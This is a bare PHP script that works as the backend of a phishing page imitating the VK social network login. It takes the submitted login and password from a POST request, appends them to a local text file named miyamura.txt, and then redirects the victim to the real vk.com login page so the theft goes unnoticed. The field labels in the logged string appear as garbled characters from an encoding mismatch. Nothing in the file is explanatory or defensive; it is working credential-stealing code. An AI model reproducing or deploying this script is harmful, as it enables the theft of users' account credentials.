<?PHP
$Login = $_POST['login']; 
$Pass = $_POST['pass']; 

$log = fopen("miyamura.txt","a+"); 
fwrite($log,"\n�����: [$Login] ; ������: [$Pass] \n<br>"); 
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://vk.com/login.php'></head></html>"; 
?>